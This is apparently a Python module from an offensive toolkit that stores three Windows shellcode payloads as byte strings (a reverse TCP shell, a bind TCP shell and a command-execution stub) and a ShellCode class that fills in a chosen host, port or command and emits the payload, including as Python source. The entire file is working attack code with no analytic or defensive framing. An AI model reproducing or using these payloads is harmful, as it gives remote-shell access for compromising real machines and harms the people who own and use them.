# -*- coding: utf-8 -*-
import struct

REVERSE_TCP_FORMAT  = ""
REVERSE_TCP_FORMAT += "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
REVERSE_TCP_FORMAT += "\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
REVERSE_TCP_FORMAT += "\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
REVERSE_TCP_FORMAT += "\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
REVERSE_TCP_FORMAT += "\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
REVERSE_TCP_FORMAT += "\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
REVERSE_TCP_FORMAT += "\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
REVERSE_TCP_FORMAT += "\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
REVERSE_TCP_FORMAT += "\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
REVERSE_TCP_FORMAT += "\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
REVERSE_TCP_FORMAT += "\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
REVERSE_TCP_FORMAT += "\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
REVERSE_TCP_FORMAT += "\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00"
REVERSE_TCP_FORMAT += "\xff\xd5\x6a\x05\x68%s"
REVERSE_TCP_FORMAT += "\x68\x02\x00%s"
REVERSE_TCP_FORMAT += "\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea"
REVERSE_TCP_FORMAT += "\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5"
REVERSE_TCP_FORMAT += "\x74\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec"
REVERSE_TCP_FORMAT += "\xe8\x61\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02"
REVERSE_TCP_FORMAT += "\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a"
REVERSE_TCP_FORMAT += "\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53"
REVERSE_TCP_FORMAT += "\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9"
REVERSE_TCP_FORMAT += "\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x22\x58\x68\x00\x40"
REVERSE_TCP_FORMAT += "\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57"
REVERSE_TCP_FORMAT += "\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\xe9"
REVERSE_TCP_FORMAT += "\x71\xff\xff\xff\x01\xc3\x29\xc6\x75\xc7\xc3\xbb\xf0"
REVERSE_TCP_FORMAT += "\xb5\xa2\x56\x6a\x00\x53\xff\xd5"


BIND_TCP_FORMAT =  ""
BIND_TCP_FORMAT += "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
BIND_TCP_FORMAT += "\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
BIND_TCP_FORMAT += "\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
BIND_TCP_FORMAT += "\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
BIND_TCP_FORMAT += "\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
BIND_TCP_FORMAT += "\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
BIND_TCP_FORMAT += "\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
BIND_TCP_FORMAT += "\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
BIND_TCP_FORMAT += "\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
BIND_TCP_FORMAT += "\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
BIND_TCP_FORMAT += "\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
BIND_TCP_FORMAT += "\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
BIND_TCP_FORMAT += "\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00"
BIND_TCP_FORMAT += "\xff\xd5\x6a\x0b\x59\x50\xe2\xfd\x6a\x01\x6a\x02\x68"
BIND_TCP_FORMAT += "\xea\x0f\xdf\xe0\xff\xd5\x97\x68\x02\x00%s\x89"
BIND_TCP_FORMAT += "\xe6\x6a\x10\x56\x57\x68\xc2\xdb\x37\x67\xff\xd5\x85"
BIND_TCP_FORMAT += "\xc0\x75\x58\x57\x68\xb7\xe9\x38\xff\xff\xd5\x57\x68"
BIND_TCP_FORMAT += "\x74\xec\x3b\xe1\xff\xd5\x57\x97\x68\x75\x6e\x4d\x61"
BIND_TCP_FORMAT += "\xff\xd5\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f"
BIND_TCP_FORMAT += "\xff\xd5\x83\xf8\x00\x7e\x2d\x8b\x36\x6a\x40\x68\x00"
BIND_TCP_FORMAT += "\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5"
BIND_TCP_FORMAT += "\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff"
BIND_TCP_FORMAT += "\xd5\x83\xf8\x00\x7e\x07\x01\xc3\x29\xc6\x75\xe9\xc3"

WINCMD_FORMAT =  ""
WINCMD_FORMAT += "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
WINCMD_FORMAT += "\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
WINCMD_FORMAT += "\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
WINCMD_FORMAT += "\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
WINCMD_FORMAT += "\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
WINCMD_FORMAT += "\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
WINCMD_FORMAT += "\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
WINCMD_FORMAT += "\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
WINCMD_FORMAT += "\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
WINCMD_FORMAT += "\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
WINCMD_FORMAT += "\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00"
WINCMD_FORMAT += "\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5"
WINCMD_FORMAT += "\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a"
WINCMD_FORMAT += "\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
WINCMD_FORMAT += "\xff\xd5%s\x00"

def getPythonCode(code):
    codes = "shellcode = \""
    for c in code:
        cc = hex(ord(c))
        codes += "\\x0" + cc[2:] if len(cc)<4 else "\\x" + cc[2:]
    codes += "\""
    return codes

class ShellCode(object):
    def __init__(self, args={"type":"reverse_tcp", "host":"127.0.0.1", "port":"1234"}):
        self.args = args

    def getHost(self):
        if self.args["type"] == "reverse_tcp":
            return "".join(map(lambda addr: struct.pack(">B", int(addr)), self.args["host"].split(".")))
        else:
            return None

    def getPort(self):
        if (self.args["type"] == "reverse_tcp") or (self.args["type"] == "bind_tcp"):
            return struct.pack(">H", self.args["port"])
        else:
            return None

    def getCmd(self):
        if self.args["type"] == "win_cmd":
            return self.args["cmd"]
        else:
            return None

    def getShellCode(self):
        if self.args["type"] == "reverse_tcp":
            return REVERSE_TCP_FORMAT % (self.getHost(), self.getPort())
        elif self.args["type"] == "bind_tcp":
            return BIND_TCP_FORMAT % (self.getPort())
        elif self.args["type"] == "win_cmd":
            return WINCMD_FORMAT % (self.getCmd())
        else:
            return None
